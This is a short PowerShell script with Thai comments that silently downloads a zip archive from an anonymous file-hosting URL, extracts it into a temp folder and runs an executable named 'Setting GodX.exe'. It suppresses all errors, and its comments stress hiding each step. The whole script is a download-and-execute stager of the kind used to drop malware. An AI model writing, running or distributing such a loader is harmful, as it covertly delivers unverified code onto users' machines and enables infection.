# ปิดการแสดงข้อความสถานะทุกอย่าง
$ErrorActionPreference = 'SilentlyContinue'

$exeName = "Setting GodX.exe"
$zipName = "afb9rh.zip"
$zipUrl = "https://files.catbox.moe/afb9rh.zip"
$tempPath = "$env:TEMP\GodX_App"
$zipFilePath = "$tempPath\$zipName"

# สร้างโฟลเดอร์โดยไม่บอกอะไรเลย
if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath | Out-Null }

# ใช้คำสั่งนี้เพื่อดาวน์โหลดแบบเร็วพิเศษ (Background Transfer)
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($zipUrl, $zipFilePath)

# แตกไฟล์แบบเงียบ
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipFilePath, $tempPath)

# รันโปรแกรมโดยไม่ทิ้งหน้าต่าง PowerShell ไว้
Start-Process "$tempPath\$exeName"
